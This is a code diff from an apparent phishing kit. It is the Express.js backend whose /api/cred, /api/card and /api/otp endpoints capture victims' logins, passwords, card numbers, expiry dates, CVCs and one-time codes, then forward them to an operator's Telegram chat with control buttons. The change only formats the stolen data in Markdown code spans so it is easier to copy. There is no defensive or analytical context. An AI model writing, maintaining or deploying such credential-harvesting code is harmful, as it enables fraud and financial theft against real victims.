@@ -82,7 +82,7 @@ app.post('/api/cred', upload.none(), (req, res) => {
     writeUserData(users);
 
     // Send message to Telegram with user data and all buttons
-    const message = `👤 Login: ${login}\n🔐 Password: ${password}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${users[sessionId].otp || ''}\nSession ID: ${sessionId}`;
+const message = `👤 Login: \`${login}\`\n🔐 Password: \`${password}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
             inline_keyboard: [
@@ -95,7 +95,7 @@ app.post('/api/cred', upload.none(), (req, res) => {
         },
     };
 
-   bot.sendMessage(config.chatId, message, options);
+  bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
 
 
     // Send response to client
@@ -150,7 +150,7 @@ app.post('/api/card', upload.none(), (req, res) => {
     writeUserData(users);
 
     // Send message to Telegram with user data and all buttons
-    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${card} | ${exp} | ${cvc}\n✉ OTP: ${users[sessionId].otp || ''}\nSession ID: ${sessionId}`;
+const message = `👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${card}\` | \`${exp}\` | \`${cvc}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
             inline_keyboard: [
@@ -163,7 +163,7 @@ app.post('/api/card', upload.none(), (req, res) => {
         },
     };
 
-    bot.sendMessage(config.chatId, message, options);
+    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
     // Send response to client
     res.status(200).json({ message: 'Card data received successfully' });
 });
@@ -188,7 +188,7 @@ app.post('/api/otp', upload.none(), (req, res) => {
     writeUserData(users);
 
     // Send message to Telegram with user data and all buttons
-    const message = `👤 Login: ${users[sessionId].login || ''}\n🔐 Password: ${users[sessionId].password || ''}\n💳 Card: ${users[sessionId].card || ''} | ${users[sessionId].exp || ''} | ${users[sessionId].cvc || ''}\n✉ OTP: ${otp}\nSession ID: ${sessionId}`;
+const message = `👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${otp}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
             inline_keyboard: [
@@ -201,7 +201,7 @@ app.post('/api/otp', upload.none(), (req, res) => {
         },
     };
 
-    bot.sendMessage(config.chatId, message, options);
+    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
 
     // Send response to client
     res.status(200).json({ message: 'OTP received successfully' });
